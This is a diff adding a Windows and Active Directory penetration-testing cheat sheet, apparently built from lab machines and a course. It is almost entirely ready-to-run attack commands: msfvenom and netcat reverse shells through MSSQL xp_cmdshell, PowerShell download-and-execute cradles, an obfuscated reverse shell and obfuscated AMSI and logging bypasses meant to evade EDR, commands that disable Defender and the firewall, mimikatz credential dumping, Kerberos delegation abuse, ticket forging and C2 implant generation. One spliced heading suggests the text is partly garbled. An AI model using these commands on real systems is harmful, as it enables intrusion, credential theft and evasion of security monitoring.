+msfvenom -p windows/shell_reverse_tcp lhost=$your_ip lport=9001 -f hta-psh > shell.hta
+```
+
+Into database shell
+
+```bash
+xp_cmdshell "mshta http://$your_ip/shell.hta"
+```
+
+Then start listener
+
+About reverse shells by binary files
+
+```bash
+windows-binaries -h
+```
+
+```bash
+xp_cmdshell "powershell wget http://$your_ip/nc.exe -OutFile c:\UsersPublic\nc.exe"
+xp_cmdshell  "c:\UsersPublic\nc.exe -e cmd.exe $your_ip &your_port"
+```
+
+Also if is finded a mysql.exe and creds
+
+```bash
+c:\path\to\mysql.exe -u username -p password -e 'show databases;'
+```
+
+Catch hash from `Microsoft SQL Server 2019` method if reverse is not able to do
+
+1.Start responder
+2.Send a request from `database` to `local` machine
+
+```bash
+EXEC master .. xp_dirtree '\\<local_machine>\Share'
+```
+
+Domain Users enumeration by database tool `msfconsole`, set options
+
+```bash
+use auxiliary/admin/mssql/mssql_enum_domain_accounts  
+```
+
+Database enumeration https://juggernaut-sec.com/mssql/[here]
+
+After database connection
+
+```bash
+impacket-mssqlclient 'darkzero.htb'/'john.w':'RFulUtONCOL!'@10.129.10.126 -windows-auth
+```
+
+We can enum a domain forest and users
+
+```bash
+enum_links
+```
+
+If we use anouther link there can be anouther configurations 
+
+```bash
+use_link "DC02.darkzero.ext"
+```
+
+
+Userfull `msfconsole` modules for enumeration `MSSQL`. Users enum in domain , reverse shell crafting , `enable_xp_cmdshell` , database dumping (Non-default) , dumping users hashes
+
+```bash 
+use auxiliary/admin/mssql/mssql_sql 
+use auxiliary/admin/mssql/mssql_enum
+use auxiliary/admin/mssql/mssql_enum_sql_login
+use auxiliary/admin/mssql/mssql_findandsampledata
+use auxiliary/scanner/mssql/mssql_hashdump
+use exploit/windows/mssql/mssql_payload
+use auxiliary/admin/mssql/mssql_escalate_execute_as
+```
+
+MSSQL enumeration with `PowerUpSQL`
+
+Enumerate SQL Servers
+
+```bash
+Get-SQLInstanceDomain
+```
+
+Check if we have a permission to authorize to `SQL Server`
+
+```bash
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose 
+```
+
+Then i will use a `impacket-mssqlclient` to provide connection
+
+To what other SQL servers connected server cat connect
+
+Version of OS and SQL Server
+
+```bash
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT @@version' -QueryTarget eu-sqlx
+```
+
+All databases in server 
+
+```bash
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT * FROM master.dbo.sysdatabases' -QueryTarget eu-sqlx
+```
+
+```bash
+select * from master..sysservers
+```
+
+The same as previous but from other link
+
+```bash
+select * from openquery("DCORP-SQL1",'select * from master..sysservers')
+```
+
+Execute commands in related to database link Windows host
+
+```bash
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
+```
+
+Automatic graph of trusts between SQL servers
+
+```bash
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
+```
+
+RCE via SQL server with AMSI bypass
+
+```bash
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.24/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.24/Amsi-Byp.txt);iex (iwr -UseBasicParsing http://172.16.100.24/Invoke-PowerShellTcpEx.ps1); Power -Reverse -IPAddress 172.16.100.24 -Port 433"''' -QueryTarget eu-sql26
+```
+
+Run .exe file from SMB share
+
+```bash
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-studentx.dollarcorp.moneycorp.local\studentsharex\FindLSASSPID.exe''' -QueryTarget eu-sqlx
+```
+
+
+
+
+[[forwarding]]
+== Port-Forwarding
+
+If some services is runned at `localhost` to enumerate this
+
+
+```bash
+netstat -ano
+```
+
+Returns all services that is running at `machine` and returns a `PID` value - looks like 4200
+
+```bash
+tasklist 4200
+```
+
+This returns what servise is running at this port
+
+Great tool to `Port-Forwarding` is *Sliver C2* tool more info https://sliver.sh/[here]
+
+Also can be used for `reverse shell` in `sessions`
+
+*Install and starting*
+
+```bash
+curl https://sliver.sh/install | sudo bash
+#
+sudo systemctl start sliver
+#
+sliver
+```
+
+Into sliver
+
+Command generates `.exe` file which must be executed in target machine, in this example named `pivot.exe`
+
+```bash
+generate --mtls $your_ip:$your_port --save pivot.exe --os windows
+```
+
+Start listener
+
+```bash
+mtls -L $your_ip -l $your_port
+```
+
+In target machine run file
+
+```bash
+./pivot.exe
+```
+
+In `Sliver` , view and connect to session
+
+```bash
+sessions
+#
+sessions -i $session_id
+```
+
+$session_id looks like `5b4640a8`
+
+
+Sliver C2 configured in proxy `SOCKS5` so need to change a `/etc/proxychains.conf` to `SOCKS5` in port `1081`
+
+
+Anouther way to tunnel port by tool `chisel`
+
+In local machine
+
+```bash
+./chisel server -p 8001 --reverse
+```
+
+In target machine where port `8004` it's in which port tunnel in local machine and `8000` what port in target machine to tunnel
+
+```bash
+./chisel.exe client 10.10.10.10:8001 R:8004:127.0.0.1:8000
+```
+
+Tunneling also can be done by `ligolo`
+
+```bash
+sudo ligolo-proxy -selfcert -laddr 'my_ip:5050'
+```
+
+There is agents for Windows and Linux so after agent transfering to target host we can connect back to our proxy
+
+```bash
+./agent -connect my_ip:5050 -ignore-cert -retry
+```
+
+Then choose current session and type
+
+```bash
+autoroute
+```
+
+For double pivoting start listener in obtained host in which running tunneling
+
+```bash
+listener_add --addr agent_listening_address:port--to [local_listening_address:port] --tcp
+```
+
+Then transfer agent to second target machine and connect back to target one listener
+
+```bash
+./agent -connect agent_listening_address:port -ignore-cert -retry
+```
+
+It connects back and you don't need `autoroute` again just use an existing interface created in target one if you need to add some new ip ranges use
+
+EXP
+
+```bash
+sudo ip route add 192.168.100.0/24 dev romanticbutterc
+```
+
+List your routes 
+
+```bash
+sudo ip route list
+```
+
+Delete route and interface
+
+```bash
+sudo ip link delete romanticbutterc
+```
+
+[[ssh]]
+== SSH
+
+When a port `22` is open in Windows machine it can be connected the same as in linux machines
+
+```bash
+ssh username@target_ip
+```
+
+Kerberos auth to `ssh`
+
+```bash
+KRB5CCNAME=user.ccache ssh -K username@domain  -v
+```
+
+Also file can be exported
+
+```bash
+export KRB5CCNAME=user.ccache 
+```
+
+Copy a file from `ssh` connection
+
+```bash
+scp username@remote:/file/to/receive /where/to/put/locally
+```
+
+Download a file from `ssh` connection
+
+```bash
+scp -P 22 ./SharpGPOAbuse.exe m.schoolbus@frizz.htb:"C:/PATH/TO/FILE/"
+```
+
+[[Delegations]]
+== Delegations
+
+**Unconstrained**
+
+If an account (user or computer), with unconstrained delegations privileges, is compromised, an attacker must wait for a privileged user to authenticate on it (or force it) using Kerberos. The attacker service will receive an ST (service ticket) containing the user's TGT. That TGT will be used by the service as a proof of identity to obtain access to a target service as the target user. Alternatively, the TGT can be used with S4U2self abuse in order to gain local admin privileges over the TGT's owner. There is the same as in `SeEnableDelegationPrivilege` in part of `Unconstrained` delegation if user has permision in WinRM or ACL it doent's matter. With obtained ST ticket you can do everything that can do compromised user log with `evil-winrm` for example. Target account must have an attribute `TRUSTED_FOR_DELEGATION`. Think if you can modify it.
+
+**Constrained**
+
+If a service account, configured with constrained delegation to another service, is compromised, an attacker can impersonate any user (e.g. domain admin, except users protected against delegation) in the environment to access another service the initial one can delegate to. There is the same as  `SeEnableDelegationPrivilege` part of `Constrained`. Always check your opportunities with delegation i mean that check what computers you control , are you allowed to delegate over DC use an `impacket-findDelegation` for enumeration. Target must have attribute `TRUSTED_TO_AUTH_FOR_DELEGATION`. Think if you can modify it.
+
+**Resource-based constrained**
+
+If an account, having the capability to edit the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of another object (e.g. the GenericWrite ACE), is compromised, an attacker can use it populate that attribute, hence configuring that object for RBCD.For this attack needed a account which has `SPN` it can be computer or user account , Account with has a `sAMAccountName` mostly computer accounts. Attribute `msDS-AllowedToActOnBehalfOfOtherIdentity`
+
+If a computer account has a privilege to delegate over `DC` you can request a ticket for any user in domain (which can be delegated)
+
+```bash
+impacket-getST -spn 'cifs/dc01.vintage.htb' -altservice 'HTTP/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip 'dc01.vintage.htb' 'vintage.htb/fs01$:fs01'
+```
+
+If you don't have this scenario think about which computer account i control? Can i add it a privileges? 
+
+If we have a privilage to create a `Resource-based constrained` 
+
+```bash
+impacket-rbcd -delegate-from 'ldap_monitor' -delegate-to delegator$ -dc-ip '10.129.232.31' -action write 'rebound.htb/delegator$' -k -no-pass -dc-host dc01.rebound.htb -use-ldaps
+```
+
+While requesting a more privileged user `Service Ticket` we got errors
+
+```bash
+[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
+[-] Probably SPN is not allowed to delegate by user delegator$ or initial TGT not forwardable
+```
+
+Target user can be protected for delegation but nowhere `DC01$` 
+
+If we do a `Resource-based constrained`  delegation we can extract `DC01$` service ticket
+
+```bash
+impacket-getST 'rebound.htb/ldap_monitor:1GR8t@$$4u'  -spn 'browser/dc01.rebound.htb' -impersonate 'DC01$' -k
+```
+
+But with it we don't have an access to `cifs` (FIle System)
+
+```bash
+impacket-getST -spn 'http/dc01.rebound.htb' -impersonate 'DC01$' -altservice 'cifs' -hashes :a31c61fe5ddd5b57f6935f5bd529a0fb 'rebound.htb/delegator$' -additional-ticket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache 
+```
+
+We request a ticket via previous ticket to `cifs` service in system. Then try to dump domain by `impacket-secretsdump`
+
+[[privesc]]
+== Privilage Escalation
+
+Default Privileges no privilege escalation 
+
+```bash
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+
+Privilage Escalation is the same as in standarlone machines more info in this https://github.com/Neiton-cmd/PentestCheatList/blob/main/PrivEscalation/Windows.md[repo]
+
+Certificates https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-2-ac7f925d1547[here]
+
+[[backup]]
+=== SeBackupPrivilege
+
+```bash
+cd c:\
+mkdir Temp
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system
+```
+
+So we do a copy of folowing files into `/Temp` directory
+
+`SAM` contains local users and their hashes
+
+`SYSTEM` contains the main it's `BootKey` if we don't have system sam is empty thing
+
+To dump hashes of local users can be used tool `impacket-secretsdump`
+
+```bash
+impacket-secretsdump -sam sam -system system local   
+```
+
+Must return something like this
+
+```bash
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Cleaning up... 
+```
+
+[[file]]
+== File Transferingsafetykatz.exe "privilege::debug" "sekurlsa::evasive-logonpasswords" "exit" 
+
+If EDR and AMSI catches us we can try to load PowerShell script in *MEMORY*
+
+```bash
+iex (New-Object Net.WebClient).DownloadString('http://10.10.14.162/reverse.ps1')
+```
+
+To avoid logs in system use `InviShell` 
+
+Then try AMSI bypass one-liners
+
+Obfuscated reverse shell to avoid EDR
+
+```bash
+$c = New-Object System.Net.Sockets.TCPClient("10.10.14.162", 9001); $s = $c.GetStream(); [byte[]]$b = 0..65535| %{0}; while(($i = $s.Read($b, 0, $b.Length)) -ne 0){; $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i); $sb = (iex $d 2>&1 | Out-String ); $sb2 = $sb + "PS" + "> "; $sby = ([text.encoding]:: ASCII).GetBytes($sb2); $s.Write($sby,0,$sby.Length); $s. Flush()}; $c.Close()$
+```
+
+Check where EDR excludes path where we can run any script. Exist tools for this mission but i prefer to check logs
+
+```bash
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)]]" | Where-Object { $_.Message -like "*exclusion*" } | Select-Object Message | FL
+```
+
+[[SeImpersonatePrivilege]]
+== SeImpersonatePrivilege
+
+Out target is `SeImpersonatePrivilege` is dangerous because it allows a process to impersonate another user’s security token, which can be abused to escalate privileges to SYSTEM using techniques like Potato attacks. An attacker can use it to impersonate higher-privileged tokens and execute code as SYSTEM, effectively taking full control of the machine. The account iis `apppool\defaultapppool` has this privilege because IIS needs to impersonate authenticated users when handling web requests, but this becomes risky if the web application is compromised.It is example
+
+```bash
+windows-binaries -h
+```
+
+Transfer a `nc.exe` 
+
+```bash
+.\GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.89 9001"
+```
+
+[[dpapi]]
+=== DPAPI secrets 
+
+The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:
+
+```bash
+C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
+```
+
+Below are common paths of hidden files that usually contain DPAPI-protected data.
+
+```bash
+C:\Users\$USER\AppData\Local\Microsoft\Credentials\
+C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
+```
+
+1.Dump Decrypted key starts with `0x` where sid is compomised_user
+
+```bash
+impacket-dpapi masterkey -file "/path/to/file/locally/master" -sid S-1-<SNIP>-1107 -password 'compromised_password'
+```
+Returns a long `MD4` key
+
+2.Dump target user password where master2 is a file from `Credentials\` directory
+
+```bash
+impacket-dpapi credential -file "/path/to/file/locally/master2" -key '0xd9a570722fbaf7149f9f<SNIP>9e9c84'
+```
+
+[[delegation]]
+=== SeEnableDelegationPrivilege
+
+1.Attack flow 
+
+2.Create computer account
+
+3.Add DNS record
+
+4.Add SPN
+
+5.Enable delegation
+
+6.Trigger authentication
+
+7.Capture ticket
+
+8.Dump NTDS
+
+
+Create a computer using a `MachineAccountQuota`
+
+```bash
+addcomputer.py -computer-name colosion -computer-pass colosion -dc-ip 10.129.5.144 delegate.vl/N.Thompson:'KALEB_2341'
+```
+
+Map hostname to attacker IP so DC connects to us
+
+```bash
+dnstool -u 'delegate.vl\colosion$' -p 'colosion' --action add --record colosion.delegate.vl --data 10.10.14.89 --type A -dns-ip 10.129.5.144  dc1.delegate.vl
+```
+
+Validate a DNS
+
+```bash
+dig @10.129.5.144 colosion.delegate.vl +noall +answer
+```
+
+Add spn to created computer. If there is a issues trying a `additional` flag. Add service so Kerberos tickets can be requested
+
+```bash
+addspn -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/colosion.delegate.vl' -t 'colosion$' -dc-ip 10.129.5.144 dc1.delegate.vl 
+```
+
+Set unconstrained delegation on the computer
+
+```bash
+bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'colosion$' -f TRUSTED_FOR_DELEGATION
+```
+
+Verify target can be forced to authenticate
+
+```bash
+nxc smb dc1.delegate.vl -u 'colosion$' -k   -M coerce_plus
+```
+
+Before setting a `Krbrelayx` listener we must create a `NTLM` hash for computer password
+
+```bash
+pypykatz crypto nt 'colosion'
+```
+
+Set a `Krbrelayx` listener. Hash is taken from `pypykatz`. Wait for incoming Kerberos authentication
+
+```bash
+krbrelayx -hashes :49738a5a7c6ccc06392d9af633139895
+```
+
+Force DC to authenticate to our fake host
+
+```bash
+nxc smb dc1.delegate.vl -u 'colosion$' -k  -M coerce_plus -o LISTENER=colosion.delegate.vl METHOD=PrinterBug
+```
+
+When `DC` obtained dump `NTDS.dit`
+
+```bash
+nxc smb dc1.delegate.vl --use-kcache --ntds
+```
+
+
+If you got a `GenericAll` to existing machine and it fails some steps from previous `SeEnableDelegationPrivilege` exploitation you can perform a `Constrained Delegation` on an existing machine. All steps can be checked by `impacket-findDelegation`
+
+First change password of machine account. `GenericAll` required
+
+```bash
+bloodyad --host dc.redelegate.vl -d redelegate.vl -u HELEN.FROST -p 'Pa33word@!'  set password fs01$ 'Pa33word@!'  
+```
+
+`TRUSTED_TO_AUTH_FOR_DELEGATION` add this attribute to `uac` for `Constrained Delegation` 
+
+```bash
+bloodyad --host dc.redelegate.vl -d redelegate.vl -u HELEN.FROST -p 'Pa33word@!'  add uac 'fs01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION 
+```
+
+Also modify a `msDS-AllowedToDelegateTo` pointing to `cifs/dc.redelegate.vl`. It's doing because after we got a `CIFS` service ticket
+
+```bash
+bloodyad --host dc.redelegate.vl -d redelegate.vl -u HELEN.FROST -p 'Pa33word@!'  set object 'fs01$' msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'
+```
+
+Get a `CIFS` service ticket as a `DC` 
+
+```bash
+impacket-getST redelegate.vl/'fs01$':'Password1@!' -spn cifs/dc.redelegate.vl -impersonate dc
+```
+
+Then we perform a `DCSync` attack or dump `ntds.dit` hashes as we have a full access to file system
+
+
+[[cross-session]]
+== Cross-Session
+
+*Cross-Session* is able to do when two user in same computer logged in in the same time
+
+Can be identified by
+
+```bash
+get-process # enumerate process runned on dc
+
+qwinsta # what users is logged in
+```
+
+Other way with tool *RunasCs.exe* which is more easy
+
+```bash
+Runascs.exe x x "qwinsta *" -l 9
+```
+
+Some example of output
+
+```bash
+console     user      1    Active 
+```
+
+Exploitation
+
+Start listener
+
+```bash
+sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:target_machine_ip:9999
+```
+
+Run `RemotePotato0.exe` in target machine
+
+```bash
+./RemotePotato0.exe -m 2 -s 1 -x local_ip
+```
+
+[[Credential_Dumping]]
+== Credential Dumping
+
+For credential dumping from system is used mimikatz or LaZagne.exe, i use mimikatz for dumping machine creds and LaZagne users' 
+
+For successfull dumping creds is higly recommended to run .exe wthis `SYSTEM` privileges also mention recomended to run mimikatz and LaZagne in shell instead of `evil-winrm`
+
+```bash
+.\mimikatz.exe
+```
+
+Dump all creds in system
+
+```bash
+mimikatz # sekurlsa::logonpasswords
+```
+
+Look documentation https://hackviser.com/tactics/tools/mimikatz[here]
+
+Also `LaZagne`
+
+```bash
+.\LaZagne.exe
+```
+
+Dump all creds in system
+
+```bash
+LaZagne.exe all
+```
+
+Documentation https://github.com/AlessandroZ/LaZagne[here]
+
+Credentials of users with sessions on the target computer
+
+```bash
+SafetyKatz.exe sekurlsa::evasive-keys exit"
+```
+
+All credentials from the domain extracted from DC
+
+```bash
+SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
+```
+
+```bash
+safetykatz.exe "privilege::debug" "sekurlsa::evasive-logonpasswords" "exit" 
+```
+
+
+[[ToSystem]]
+== ToSystem
+
+If we are a Administrator in machine we can elewate privileges to `system` by tool `SweetPotato.exe` this is a technique which contains a multiple privilege escalation vectors such as 
+
+```bash
+RottenPotato
+JuicyPotato
+PrintSpoofer
+EfsPotato / PetitPotam
+```
+
+Start listener
+
+```bash
+rlwrap nc -lvnp  9001
+```
+
+Trigger system
+
+```bash
+.\SweetPotato.exe -e 2 -p C:\Windows\System32\cmd.exe -a "/c C:\Users\$USER\Documents\nc.exe ATTACKER_IP 4444 -e cmd.exe"
+```
+
+[[local]]
+== Local PrivEsc
+
+Use `PowerUp.ps1` , `winPEASany.exe`  to check local privilege escalation 
+
+```bash
+Invoke-AllChecks
+```
+
+Abuse service , output of `Invoke-AllChecks` will show it
+
+```bash
+Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName dcorp\student714
+```
+
+[[amsi]]
+== AMSI
+
+AMSI bypass is used to disable or evade the Windows Antimalware Scan Interface so malicious scripts (e.g., PowerShell) are not scanned at runtime. Attackers typically patch AMSI in memory or manipulate its initialization functions, allowing execution of obfuscated payloads without being detected by antivirus.AMSI bypass it's not hard technique just to know some payloads
+
+Bypass AMSI:
+
+```bash
+S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+
+Disable AV & Open Firewall:
+
+```bash
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+Also to disable a light antivirus if you trying to import a PowerShell script try to rename functions and remove a description maybe AV triggers when see that.
+
+[[post-exploatation]]
+== post-exploitation
+
+So in post-exploitation we talk about pivoting,tunneling,domain discovery
+
+Domain discovery by `nmap` and `netexec`
+
+```bash
+nmap -sn 10.10.10.0/24
+```
+
+```bash
+nxc smb/ldap/winrm 10.10.10.0/24
+```
+
+Also can be done with creds
+
+First if we see that our machine has anouther interface in `ifconfig` or `ipconfig` it's 99% a pre-vector to discover a new interface for exp. `192.168.010.0/24` use `ligolo` see more https://github.com/nicocha30/ligolo-ng[here] . Also mention mostly can be used only 80 and 443 ports
+
+In kali machine start ligolo listener
+
+```bash
+sudo ligolo-proxy -selfcert -laddr '10.10.10.00:443'
+```
+
+In target machine
+
+```bash
+./agent -ignore-cert -connect '10.10.10.10:443'
+```
+
+In kali machine
+
+```bash
+sudo ip route add 10.10.10.0/24 dev ligolo
+```
+
+If in bloodhound you see some relationships between domains in target machine in shell or evil-winrm for exp. we are in domain A and have a `TrustedBy` to domain B so in winrm computer in domain A
+
+```bash
+nltest /dsgetdc:target_domain
+```
+
+This gives a ip and dc.name of target domain
+
+
+If we have only smb share access with admin privileges we can dump `ntds.dit` file which contains an `NTLM` hashes of all users in domain
+
+```bash
+impacket-secretsdump domain.htb/'Administrator'@dc.domain.htb -dc-ip 10.10.10.10 -target-ip 10.10.10.10 -use-vss -k -no-pass
+```
+
+When you compromise some machine mostly working in linux hosts you can dump network connections 
+
+Check connections 
+
+```bash
+arp -an
+```
+
+Start a `tcpdump` listener and grap for 5-10 minutes
+
+```bash
+tcpdump -w nix01.cap "22" -v
+```
+
+Then open with `wireshark`
+
+```bash
+wireshark -r WS-01_PktMon.pcap
+```
+
+You need to find moslty some auth packet to catch cleartext creds or hashes. It's working with all `.pcap` files 
+
+
+Show and Resolve IP of all computers in Domain
+
+```bash
+impacket-GetADComputers -hashes ':5bdd6a33efe43f0000e3b2435579aa53' domain.local/Administrator -no-pass -dc-ip 10.10.10.10 -resolveIP
+```
+
+[[av]]
+== AV evasion
+
+Use Obfuscated and Transformated scripts like in CRTP course. `Loader.exe` it's a great tool for loading malicious .exe files 
+
+Just an example
+
+```bash
+.\Loader.exe -path http://172.16.100.14/Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:
+```
+
+If we got a Administrator in target machine we can disable a AV temponary in `Windows Defender`
+
+```bash
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+Also firewall can be disabled in `Windows Defender Firewall` 
+
+```bash
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+```
+
+SBLoggingBypass
+
+```bash
+[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
+```
+
+
+
+[[trust]]
+== Domain Trusts
+
+Enum
+
+check all domain trusts
+
+```bash
+nltest /domain_trusts
+```
+
+Verbose trust to target domain
+
+```bash
+Get-ADTrust -Identity target_domain | fl *
+```
+
+Bloodhound shows a `SameForestTrust` between domains this means that we can generate a ticket for other domain if we have one domain compromised 
+
+```bash
+impacket-ticketer  -aesKey '154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848' -domain-sid 'S-1-5-21-719815819-3726368948-3917688648' -domain 'DOLLARCORP.MONEYCORP.LOCAL' -extra-sid 'S-1-5-21-335606122-960912869-3279953914-519' Administrator
+```
+
+Note
+
+`-aesKey` it's a *aes256* key of `KRBTGT` user in compromised domain
+`-extra-sid ` it's a `Enterprise Admins` SID in target domain
+
+`CrossForestTrust` between domain check if `Spoof SID History` is blocked , `TGT Delegation` is disabled
+
+From enum part check 
+
+
+`SIDFilteringForestAware : ?`     *False* - SIDHistory attack (PrivEsc) between domains
+
+`SIDFilteringQuarantined : ?`     *False* - SIDHistory attack (PrivEsc) between domains
+
+`TGTDelegation :           ?`     *True* - compromise account with delegation rights -> Impersonation
+
+`SelectiveAuthentication:  ?`     *False* - All users can log in to target domain from trusted domain
+
+`Direction              :  ?`     *BiDirectional* Two-Way trust compromise domain A attack B 
+
+Extract trust key between domains 
+
+```bash
+SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
+```
+
+look in compromised -> target and search `rc4_hmac_nt` 
+
+```bash
+Rubeus.exe -args evasive-silver /service:krbtgt/compromised_domain /rc4:163373571e6c000000000000060accdf0 /sid:sid_compromised_domain /ldap /user:Administrator /nowrap
+```
+
+If not works try specify /ldaps + /domain
+
+Returns `base64(ticket.kirbi)` 
+
+```bash
+Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:output_of_ticket_base64
+```
+
+Command returned a base64 encoded trusted between domains ticket to convert and use it in linux
+
+Copy base64 ticket from Rubeus output, paste in local linux machine 
+
+```bash
+nano trust_ticket.b64   
+cat trust_ticket.b64| base64 -d > trust_ticket.kirbi   
+impacket-ticketConverter trust_ticket.kirbi trust_ticket.ccache   
+```
+
+And it will be converted and ready to use
+
+[[tickets]]
+== Golden,Silver,Diamond tickets generation
+
+Golden
+
+```bash
+Rubeus.exe -args evasive-golden /aes256:krbtgt_hash /sid:domain_SID /ldap /user:impersonated_user /printcmd
+```
+
+Then use output to forge a ticket
+
+Silver
+
+```bash
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:service_name/computer_name.dollarcorp.moneycorp.local /rc4:trust_key /sid:domain_SID /ldap /user:user_to_impersonate /domain:dollarcorp.moneycorp.local /ptt
+```
+
+Diamond
+
+```bash
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:krbtgt_hash /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+[[sliver]]
+== Sliver C2
+
+Start *HTTPS* listener
+
+```bash
+https
+```
+
+Generate 
+
+```bash
+generate -b https://local_ip -e -f shellcode -N name_of_implant -s /path/to/save
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
